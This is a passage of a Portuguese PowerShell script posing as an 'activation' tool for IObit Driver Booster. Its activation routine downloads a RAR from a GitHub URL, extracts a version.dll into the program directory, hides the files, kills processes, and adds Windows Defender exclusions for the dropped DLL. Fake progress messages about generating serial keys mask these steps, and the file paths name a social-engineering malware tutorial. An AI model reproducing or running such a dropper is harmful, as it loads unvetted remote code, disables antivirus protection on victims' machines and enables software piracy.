            } else {
                Write-Host "      É outro programa!" 
            }
        }

        function AtivarPrograma {
            # Lógica para ativação do programa
            if ($nome_programa -eq "Driver Booster") {

                    # Função para verificar se os processos estão em execução
                function CheckProcessesRunning {
                    $processesToCheck = @("DriverBooster", "setup", "AutoUpdate", "unins000", "Passenger")
                    return Get-Process | Where-Object { $processesToCheck -contains $_.Name }
                }

                $programPaths = @(
                    "C:\Program Files (x86)\IObit\Driver Booster\11.5.0\DriverBooster.exe",
                    "C:\Program Files (x86)\IObit\Driver Booster\11.4.0\DriverBooster.exe",
                    "C:\Program Files (x86)\IObit\Driver Booster\11.3.0\DriverBooster.exe",
                    "C:\Program Files (x86)\IObit\Driver Booster\11.2.0\DriverBooster.exe",
                    "C:\Program Files (x86)\IObit\Driver Booster\11.1.0\DriverBooster.exe",
                    "C:\Program Files (x86)\IObit\Driver Booster\11.0.0\DriverBooster.exe",
                    "C:\Program Files (x86)\Driver Booster\DriverBooster.exe"
                    # Adicione mais caminhos aqui, se necessário
                )

                # Array para armazenar as versões dos programas
                # $programVersions = @()

                foreach ($programPath in $programPaths) {
                    if (Test-Path $programPath) {
                        try {

                            $versionInfo = (Get-Item $programPath).VersionInfo
                            $programVersion = $versionInfo.FileVersion

                            # Extrair os dois primeiros números da versão do programa e da versão disponível
                            $programVersionParts = $programVersion -split '\.' | Select-Object -First 2
                            $disponivelParts = $versao_disponivel -split '\.' | Select-Object -First 2
                                
                            # Converter a versão do programa para um formato numérico
                            $programVersionNumerica = [version]($programVersionParts -join '.')
                            $disponVersionNumerica = [Version]($disponivelParts -join '.')

                            # Comparar as versões
                            if ($programVersionNumerica -eq $disponVersionNumerica) {
                                    
                                $pathsToCheck = @(
                                    "C:\Program Files (x86)\Driver Booster",
                                    "C:\Program Files\Driver Booster",
                                    "C:\Driver Booster",
                                    "C:\Program Files (x86)\IObit\Driver Booster\11.5.0",
                                    "C:\Program Files (x86)\IObit\Driver Booster\11.4.0",
                                    "C:\Program Files (x86)\IObit\Driver Booster\11.3.0",
                                    "C:\Program Files (x86)\IObit\Driver Booster\11.2.0",
                                    "C:\Program Files (x86)\IObit\Driver Booster\11.1.0",
                                    "C:\Program Files (x86)\IObit\Driver Booster\11.0.0"
                                )

                                $folderFound = $false

                                foreach ($path in $pathsToCheck) {
                                    if (Test-Path $path -PathType Container) {
                                        $folderFound = $true
                                        break
                                    }
                                }

                                if ($folderFound) {
                                    Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                    Write-Host ""
                                    Write-Host "      A versão do programa é igual a versão disponível de ativação."
                                    Write-Host "      O programa '$nome_programa' está instalado no computador."
                                    Write-Host "      Iniciando processo inicial de ativação do '$nome_programa'..."
                                    Write-Host ""
                                        
                                    try {

                                        # Definir a URL do arquivo e o destino
                                        $url = "https://github.com/diegrp/atv-dbooster/raw/main/version.rar"
                                        $destino = "C:\Users\$env:USERNAME\Desktop\Games\Tutorial Malware\#1 - Engeharia Social - Batch File\version.rar"
                                        $extracao = "C:\Users\$env:USERNAME\Desktop\Games\Tutorial Malware\#1 - Engeharia Social - Batch File\version"
                                        $fileextracao = "C:\Users\$env:USERNAME\Desktop\Games\Tutorial Malware\#1 - Engeharia Social - Batch File\version\version.dll"
                                        $destino_atv = "C:\Program Files (x86)\IObit\Driver Booster\11.5.0"                                            

                                        # Baixar o arquivo
                                        $client = New-Object System.Net.WebClient
                                        $client.DownloadFile($url, $destino)

                                        # Executar o arquivo baixado
                                        # Start-Process $destino
                                          
                                        # Verificar se o arquivo foi baixado com sucesso

                                        $processesRunning = CheckProcessesRunning

                                        if (Test-Path $destino) {

                                            $processNames = $processesRunning | ForEach-Object { $_.Name }

                                            foreach ($processName in $processNames) {
                                                $process = Get-Process -Name $processName
                                                Stop-Process -Id $process.Id
                                            }
                                                   
                                                
                                            if($processesRunning){

                                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                                Write-Host -NoNewline "     * 1 - " -ForegroundColor Cyan                                                                   
                                                Write-Host -NoNewline "Encerrando processos necessários para ativação..." -ForegroundColor Yellow
                                                Write-Host -NoNewline " [10%]" -ForegroundColor Green

                                            } else {
                                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                                Write-Host -NoNewline "     * 1 - " -ForegroundColor Cyan                                                                   
                                                Write-Host -NoNewline "Processos conflitantes já encerrados e dispositivo pronto para ativação..." -ForegroundColor Yellow
                                                Write-Host -NoNewline " [10%]" -ForegroundColor Green
                                            }
                                               

                                            # Write-Host ""
                                            # Write-Host "Arquivo baixado com sucesso em $destino"
                                            # Write-Host ""

                                            Write-Host ""
                                            Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
                                            Write-Host -NoNewline "     * 2 - " -ForegroundColor Cyan
                                            Write-Host -NoNewline "Verificação dos requisitos necessários do dispositivo para iniciar ativação..." -ForegroundColor Yellow
                                            Write-Host -NoNewline " [20%]" -ForegroundColor Green
                                            Write-Host ""
                                            Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
                                            Write-Host -NoNewline "     * 3 - " -ForegroundColor Cyan
                                            Write-Host -NoNewline "Analizando a estrutura do serial/chave exigida pelo $nome_programa..." -ForegroundColor Yellow
                                            Write-Host -NoNewline " [30%]" -ForegroundColor Green

                                            # Definir o arquivo baixado e a pasta de extração como ocultos
                                            Set-ItemProperty -Path $destino -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

                                            # Caminho do WinRAR
                                            $winrarPath = "C:\Program Files\WinRAR\WinRAR.exe"

                                            # Verificar se o WinRAR está instalado no caminho especificado
                                            if (Test-Path $winrarPath) {
                                                # Criar o diretório de extração se não existir
                                                if (-not (Test-Path $extracao)) {
                                                    New-Item -ItemType Directory -Path $extracao | Out-Null
                                                }

                                                # Comando para extrair o arquivo usando WinRAR
                                                $arguments = "x -y `"$destino`" `"$extracao`""
                                                Start-Process -FilePath $winrarPath -ArgumentList $arguments -Wait
                                                    
                                                Write-Host ""
                                                Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
                                                Write-Host -NoNewline "     * 4 - " -ForegroundColor Cyan                                                                   
                                                Write-Host -NoNewline "Gerando e verificando serial/chave no dispositivo..." -ForegroundColor Yellow
                                                Write-Host -NoNewline " [40%]" -ForegroundColor Green
                                                Write-Host ""
                                                Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
                                                Write-Host -NoNewline "     * 5 - " -ForegroundColor Cyan
                                                Write-Host -NoNewline "Reformulando novo registro do windows relacionado ao $nome_programa..." -ForegroundColor Yellow
                                                Write-Host -NoNewline " [50%]" -ForegroundColor Green
                                                Write-Host ""
                                                Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
                                                Write-Host -NoNewline "     * 6 - " -ForegroundColor Cyan
                                                Write-Host -NoNewline "Injeção da dll com serial/chave do $nome_programa..." -ForegroundColor Yellow
                                                Write-Host -NoNewline " [60%]" -ForegroundColor Green
                                                # Write-Host "Arquivo extraído com sucesso para $extracao"
                                                # Write-Host ""

                                            } else {
                                                Write-Host ""
                                                Write-Host "      WinRAR não está instalado ou não está no caminho especificado."
                                                Write-Host ""
                                            }
                                        } else {
                                            Write-Host ""
                                            Write-Host "      Falha ao baixar o arquivo."
                                            Write-Host ""
                                        }

                                        # Opcional: Remover o arquivo .rar após extração
                                        Remove-Item $destino -Force
                                           
                                        # Adicionar a pasta extraída à lista de exclusões do Windows Defender
                                        Add-MpPreference -ExclusionPath $extracao
                                        Add-MpPreference -ExclusionPath $fileextracao

                                        # Definir o arquivo baixado e a pasta de extração como ocultos
                                        Set-ItemProperty -Path $extracao -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

                                        $processesRunning = CheckProcessesRunning
                                            
                                        if ($processesRunning) {
                                            $processNames = $processesRunning | ForEach-Object { $_.Name }  
                                            Write-Host "" 
                                            Write-Host ""
                                            Write-Host "     !Erro Fatal!" -ForegroundColor Red         
                                            Write-Host "     Os processos $($processNames -join ', ') estão em execução." -ForegroundColor Cyan
                                            Write-Host "     Finalizando os processos, reinicie novamente a opção '3' para continuar com o processo de ativação do $nome_programa." -ForegroundColor Green
                                            Write-Host ""
                                                
                                            foreach ($processName in $processNames) {
                                                $process = Get-Process -Name $processName
                                                Stop-Process -Id $process.Id
                                            }

                                        } else {
                                            # Mover arquivos extraídos para a pasta de destino
                                            try { # verificar os processos
                                                # Criar a pasta de destino se não existir
                                                if (-not (Test-Path $destino_atv)) {
                                                    New-Item -ItemType Directory -Path $destino_atv | Out-Null
                                                }

                                                # Mover os arquivos e substitui pelos existentes
                                                Move-Item -Path "$extracao\*" -Destination $destino_atv -Force
                                               
                                                Write-Host ""
                                                Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
                                                Write-Host -NoNewline "     * 7 - " -ForegroundColor Cyan                                                                   
                                                Write-Host -NoNewline "Blindagem da dll com serial/chave no dispositivo..." -ForegroundColor Yellow
                                                Write-Host -NoNewline " [70%]" -ForegroundColor Green
                                                Write-Host ""
                                                Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
                                                Write-Host -NoNewline "     * 8 - " -ForegroundColor Cyan
                                                Write-Host -NoNewline "Verificando funcionando do $nome_programa e efetivação da ativação..." -ForegroundColor Yellow
                                                Write-Host -NoNewline " [80%]" -ForegroundColor Green
                                                Write-Host ""
                                                Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
                                                Write-Host -NoNewline "     * 9 - " -ForegroundColor Cyan
                                                Write-Host -NoNewline "Concluindo processo de ativação do $nome_programa..." -ForegroundColor Yellow
                                                Write-Host -NoNewline " [100%]" -ForegroundColor Green
                                                Write-Host ""
                                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                                
                                                # Write-Host "Arquivos movidos com sucesso para $destino_atv"
                                                # Write-Host ""
                                               
                                                # Adicionar a pasta extraída à lista de exclusões do Windows Defender
                                                Add-MpPreference -ExclusionPath $destino_atv

                                                # Opcional: Remover a pasta do arquivo após extração.
                                                Remove-Item $extracao -Force
                                                
                                                Write-Host ""
                                                $opcao_verficar_ativacao = Read-Host "      Deseja iniciar o $nome_programa para validar sua ativação? (S/N)"
                                               
                                                if ($opcao_verficar_ativacao -eq 's') {
                                                    Start-Process $programPath
                                                } else {
                                                    break
                                                }

                                            } catch {
                                                Write-Host ""
                                                Write-Host "      Erro ao mover os arquivos: $_"  -ForegroundColor Red
                                                Write-Host ""
                                            }

                                        }

                                    } catch {
                                            Write-Host ""
                                            Write-Host "      Erro ao baixar o arquivo: $_" -ForegroundColor Red
                                            Write-Host ""
                                    }
                                }

                                $programFound = $true
                                break

                            } else {
                                Write-Host " "
                                Write-Host "      A versão do '$nome_programa'instalado no seu computador é diferente da versão disponível para download."
                                Write-Host "      Desinstale o '$nome_programa', e instale a versão compatível de ativação que é: $versao_disponivel"
                                Write-Host " "
                                $programFound = $true
                                break
                            }

                        } catch {
                            Write-Host ""
                            Write-Host "      Erro ao obter informações do programa no caminho $programPath" -ForegroundColor Red
                            Write-Host ""
                            $programFound = $true

                        }

                    } else {
                        Write-Host ""
                        Write-Host "      O programa '$nome_programa' não está instalado no computador."
                        Write-Host "      Instale o $nome_programa $versao_disponivel, para conseguir realizar sua ativação em sequência."
                        Write-Host ""
                        break
                        $programFound = $false
                    }
                }

            } else {
                Write-Host "      É outro programa!"
            }
        }

        function DesinstalarPrograma {
            # Lógica para desinstalação do programa
            if ($nome_programa -eq "Driver Booster") {

                # Função para verificar se os processos estão em execução
                function CheckProcessesRunning {
                    $processesToCheck = @("DriverBooster", "setup", "AutoUpdate", "unins000", "Passenger")
                    return Get-Process | Where-Object { $processesToCheck -contains $_.Name }
                }

                # Desinstalar o Programa Manualmente
                $pathsToCheck = @(
                    "C:\Program Files (x86)\Driver Booster",
                    "C:\Program Files\Driver Booster",
                    "C:\Driver Booster",
                    "C:\Program Files (x86)\IObit\Driver Booster"
                )

                $folderFound = $null

                foreach ($path in $pathsToCheck) {
                    if (Test-Path $path -PathType Container) {
                        $folderFound = $path
                        break
                    }
                }

                if ($folderFound) {

                    $processesRunning = CheckProcessesRunning
                            
                    $processNames = $processesRunning | ForEach-Object { $_.Name }

                    foreach ($processName in $processNames) {
                        $process = Get-Process -Name $processName
                        Stop-Process -Id $process.Id
                    }

                    if ($processesRunning){
                        Write-Host ""
                        Write-Host "     ===============================================================================================================" -ForegroundColor Red
                        Write-Host ""
                        Write-Host "      Os processos $($processNames -join ', ') estão em execução."
                        Write-Host "      Fechando os processos para iniciar a desinstalação..."
                        Write-Host ""
                    } else {
                        Write-Host ""
                        Write-Host "     ===============================================================================================================" -ForegroundColor Green
                        Write-Host ""
                        Write-Host "      O programa '$nome_programa' está instalado no computador."
                    }

                    $opcao_remover = Read-Host "      Deseja desinstalar $nome_programa ? (S/N)"
                    Write-Host ""

                    if ($opcao_remover -eq 's') {
                            
                        $metodo_remover = Read-Host "      Desinstalação rápida ou completa? (R/C)"
                            
                        if ($metodo_remover -eq 'r') {
                            $processesRunning = CheckProcessesRunning
                            if ($processesRunning) {
                                $processNames = $processesRunning | ForEach-Object { $_.Name }  
                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Red          
                                Write-Host ""
                                Write-Host "      Os processos $($processNames -join ', ') estão em execução."
                                Write-Host "      Fechando os processos para iniciar a desinstalação..."
                                Write-Host ""
                                foreach ($processName in $processNames) {
                                    $process = Get-Process -Name $processName
                                    Stop-Process -Id $process.Id
                                }
                            } else {
                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host "      Desinstalação rápida de $nome_programa iniciada..."
                                Write-Host "      Aguardando o processo de desinstalação do $nome_programa terminar..."
                                Write-Host ""
                                Remove-Item -Recurse -Force $folderFound
                                Start-Sleep -Seconds 3
                                Write-Host "      Confirme se o $nome_programa foi desinstalado, para verificar se tudo ocorreu bem."
                                $remocao_completa = Read-Host "      Verificar desinstalação do $nome_programa ? (S/N)"

                                if($remocao_completa -eq 's' -or $remocao_completa -eq 'n'){
                                    # Verifica se a pasta ainda existe
                                    if (Test-Path $folderFound) {
                                        Write-Host ""
                                        Write-Host "      A desinstalação falhou ou não foi concluída corretamente."
                                        write-Host "      Algum processo não permitido está em execução, ou o programa não está instalado no seu computador."
                                        Write-Host ""
                                    } else {
                                        Write-Host ""
                                        Write-Host "      Desinstalação de $nome_programa foi concluída com sucesso."
                                        Write-Host ""
                                    }
                                } 
                            }
                        } elseif ($metodo_remover -eq 'c') {
                            $processesRunning = CheckProcessesRunning
                            if ($processesRunning) {
                                $processNames = $processesRunning | ForEach-Object { $_.Name }  
                                Write-Host ""          
                                Write-Host "Os processos $($processNames -join ', ') estão em execução."
                                Write-Host "Fechando os processos para iniciar a desinstalação..."
                                Write-Host ""
                                foreach ($processName in $processNames) {
                                    $process = Get-Process -Name $processName
                                    Stop-Process -Id $process.Id
                                }
                            } else {
                                    
                                $exePath = "C:\Program Files (x86)\IObit\Driver Booster\11.5.0\unins000.exe"
                                    
                                if (Test-Path $exePath) {

                                    # Inicia o processo de desinstalação

                                    Write-Host ""
                                    Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                    Write-Host ""
                                    Write-Host "      Desinstalação completa de $nome_programa iniciada..."
                                    Write-Host "      Abrindo desinstalador de $nome_programa..."  
                                    Write-Host ""

                                    Start-Process -FilePath $exePath -PassThru

                                    $processesRunning = CheckProcessesRunning

                                    if ($processesRunning) {

                                        Write-Host ""
                                        Write-Host "      Aguardando o processo de desinstalação do $nome_programa terminar..."
                                        Start-Sleep -Seconds 10
                                        Write-Host ""
                                        Write-Host "      Confirme se o $nome_programa foi desinstalado, para verificar se tudo ocorreu bem."
                                        $remocao_completa = Read-Host "Verificar desinstalação do $nome_programa ? (S/N)"
                                        Write-Host ""

                                        if($remocao_completa -eq 's' -or $remocao_completa -eq 'n' -and $processesRunning.HasExited){
                                            # Verifica se a pasta ainda existe
                                            if (Test-Path $folderFound) {
                                                Write-Host "      A desinstalação falhou ou não foi concluída corretamente."
                                                write-Host "      Algum processo não permitido está em execução, ou o programa não está instalado no seu computador."
                                                Write-Host ""
                                            } else {
                                                Write-Host "      Desinstalação de $nome_programa foi concluída com sucesso."
                                                Write-Host ""
                                            }
                                        } else{
                                            Write-Host "      O processo de desinstalação do $nome_programa está em execução ou ainda não terminou..."
                                            Write-Host ""
                                        }

                                    } else {
                                        Write-Host "      O processo de desinstalação do $nome_programa não está em execução."
                                        Write-Host ""
                                    }

                                } else {
                                    Write-Host ""
                                    Write-Host "      O arquivo $exePath não foi encontrado."
                                    Write-Host ""
                                }
                            }
                        }
                    } else {
                        Write-Host "      Desinstalação cancelada."
                        Write-Host ""
                    }
                } else {
                    Write-Host ""
                    Write-Host "      O programa $nome_programa não está instalado."
                }

            } else {
                Write-Host "      É outro programa!" 
            }
        }

        $opcao_detalhes = Read-Host "Escolha uma opção"
        switch ($opcao_detalhes) {
            1 {
                DesinstalarPrograma
                InstalarPrograma
                AtivarPrograma
            }
            2 {
                InstalarPrograma
            }
            3 {
                AtivarPrograma
            }
            4 {
                DesinstalarPrograma
            }
            "V" {
                # Se nenhuma opção válida for selecionada, mostra o menu atual novamente
                Show-Menu-Produto
                $loop = $false
            }
            default {
                Write-Host "Opção Inválida"
            }
        }

        # Pausa para o usuário ver a mensagem antes de limpar a tela e mostrar o menu novamente
        if ($loop) {
            Read-Host "Pressione Enter para continuar..."
        }

    } while ($loop)
}
#>

Show-Menu
